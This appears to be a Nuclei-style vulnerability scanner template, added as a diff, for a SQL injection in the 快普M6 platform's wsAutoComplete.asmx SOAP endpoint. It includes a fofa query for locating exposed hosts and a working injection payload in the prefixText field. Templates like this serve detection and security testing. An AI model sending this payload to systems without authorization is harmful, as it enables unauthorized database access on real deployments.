@@ -1,0 +1,44 @@
+id: philip-m6-wsAutoComplete-sqli
+info:
+  name: 快普M6 WebService/wsAutoComplete.asmx SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 快普M6整合管理平台的WebService/wsAutoComplete.asmx接口下存在SQL注入漏洞。攻击者可通过构造恶意SQL语句，绕过参数过滤机制，实现对数据库的任意查询、修改或删除操作，甚至可能获取系统控制权限。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/nq3b8g1o813oghgp
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="Resource/JavaScript/jKPM6.DateTime.js"
+    tips:
+    repair:
+    version:
+  tags: philip,sqli,philipm6
+
+http:
+  - raw:
+      - |
+        POST /WebService/wsAutoComplete.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Type: application/soap+xml;charset=UTF-8;action="http://tempuri.org/GetAccountTitleList"
+        Content-Length: 353
+
+        <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
+          <soap:Header/>
+          <soap:Body>
+              <tem:GetAccountTitleList>
+                <!--Optional:-->
+                <tem:prefixText>'-1/user--</tem:prefixText>
+                <tem:count>1</tem:count>
+              </tem:GetAccountTitleList>
+          </soap:Body>
+        </soap:Envelope>
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 500
+          - contains_all(body,'nvarchar')
+        condition: and
